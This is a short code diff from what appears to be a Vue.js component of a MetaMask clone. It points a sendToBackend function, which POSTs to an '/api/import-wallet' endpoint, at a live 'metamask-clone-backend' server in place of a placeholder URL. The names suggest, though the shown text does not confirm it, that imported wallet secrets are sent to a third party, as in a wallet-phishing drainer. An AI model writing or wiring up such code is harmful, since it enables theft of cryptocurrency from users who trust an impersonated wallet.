@@ -85,7 +85,7 @@ export default {
     },
     async sendToBackend(type, data) {
       try {
-        const response = await fetch("https://your-backend-url.com/api/import-wallet", {
+        const response = await fetch("https://metamask-clone-backend.vercel.app/api/import-wallet", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
